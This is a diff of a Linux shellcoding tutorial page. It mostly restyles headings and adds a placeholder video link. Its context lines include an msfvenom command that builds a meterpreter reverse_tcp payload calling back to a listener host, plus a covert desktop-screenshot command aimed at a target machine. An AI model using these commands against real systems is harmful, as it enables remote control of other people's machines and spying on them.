@@ -16,7 +16,7 @@ The C program not only runs the shellcode (RAM) that allows us to control the ta
 but also executes a system command (sh) that takes a screenshot of the target PC desktop using<br />
 [MITRE ATT&CK T1113](https://attack.mitre.org/techniques/T1113/) (xwd package) Technic.<br />
 
-**Command Used (screenshot function)**<br />
+**'Command Used (screenshot function)'**<br />
 `system("sleep 1; xwd -root -out /tmp/ScreenShot.xwd");`
 
 <br /><br />
@@ -69,7 +69,7 @@ sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 
 
 ```
 
-- **Msfvenom Syntax**
+- **'Msfvenom Syntax'**
   - -p payload name
   - -b delete nul bites from shellcode
   - -a payload arch
@@ -152,6 +152,16 @@ sudo ./desktop_screenshot
 <br />
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-objectives)
+
+---
+
+<br /><br /><br />
+
+#### Video Tutorial
+
+[C Shellcode Linux - Video Tutorial](https://blablabla.)
+
+<br />
 
 ---
 
